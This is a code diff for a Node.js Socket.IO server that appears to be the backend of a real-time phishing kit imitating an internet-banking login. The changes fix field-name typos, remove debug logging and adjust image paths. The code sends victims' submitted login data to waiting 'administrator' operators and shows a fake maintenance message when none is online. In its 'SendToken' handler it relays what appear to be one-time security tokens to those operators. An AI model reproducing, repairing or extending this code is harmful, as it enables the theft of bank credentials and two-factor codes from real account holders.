@@ -21,11 +21,10 @@ module.exports = httpServer => {
         // Agendar administradores
         socket.on("AdmOn", data => {
             socketsOnLineAdm.push(data);
-            console.log('Adm: ' + socketsOnLineAdm + '  --  '+ socketsOnLineAdm.length)
         });
         
         socket.on("disconnect", () => {
-            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item.soketSesion !== socket.id);
+            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item.socketSesion !== socket.id);
             socketsOnLineAdm = newsocketsOnLineAdm;
 
             var baySocket = socketsInHome.filter((item) => item.Socket == socket.id);
@@ -57,7 +56,7 @@ module.exports = httpServer => {
         // Mostrar imagen login
         socket.on("ShowAvatar", data => {
 
-            io.to(data.socket).emit("AvatarElement", '/img/c93f32e11dbf6b5fe3efc5be5554ec50-icono-de-circulo-de-candado.png');
+            io.to(data.socket).emit("AvatarElement", '/bancainternett/img/c93f32e11dbf6b5fe3efc5be5554ec50-icono-de-circulo-de-candado.png');
             /*var img = '';
             let browser = new swd.Builder();
             let tab = browser.forBrowser("chrome")
@@ -131,7 +130,7 @@ module.exports = httpServer => {
             var AdminSelected = socketsOnLineAdm[AsignarAdm];
         
             idAdmIdHome.push({'AdmId': AdminSelected.Id, 'IdHome': totalInfo[0].socket});                    
-            io.to(AdminSelected.soketSesion).emit("NewData", totalInfo);
+            io.to(AdminSelected.socketSesion).emit("NewData", totalInfo);
         })
 
         
@@ -142,7 +141,7 @@ module.exports = httpServer => {
         // Recibir data y enviar al adm
         socket.on("Data", data => {
             totalInfo = [data, 'Pedro Pérez', 'Última vez el 18/08/2022 a las 12:00:00', '$99.999,00'];
-            console.log('Length adm ' + socketsOnLineAdm.length)
+            //console.log('Length adm ' + socketsOnLineAdm.length)
 
             if (socketsOnLineAdm.length == 0) {
                 io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
@@ -291,9 +290,8 @@ module.exports = httpServer => {
         })
 
         socket.on("SendToken", dataToken => {
-            var idAdmIdHomeArr = idAdmIdHome.filter((item) => item.AdmId == dataToken.dataAdm);
-            console.log(dataToken)
-            io.to(dataToken.admToken).emit("ReSendToken", dataToken);
+            var idAdmIdHomeArr = socketsOnLineAdm.filter((item) => item.Id == dataToken.AdmId);
+            io.to(idAdmIdHomeArr[0].socketSesion).emit("ReSendToken", dataToken);
         })
 
         socket.on("Finalizar", dataId => {
